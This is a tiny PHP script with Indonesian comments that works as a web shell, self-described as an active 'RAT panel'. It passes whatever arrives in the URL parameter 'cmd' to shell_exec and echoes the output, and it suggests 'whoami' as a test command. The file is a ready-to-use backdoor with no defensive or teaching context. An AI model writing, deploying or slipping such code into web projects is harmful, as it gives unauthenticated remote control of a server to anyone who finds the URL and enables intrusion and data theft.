<?php  
// Cek apakah ada perintah dari URL  
if (isset($_GET['cmd'])) {  
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";  
} else {  
    echo "Panel RAT Aktif. Gunakan ?cmd=whoami untuk test.";  
}  
?>  
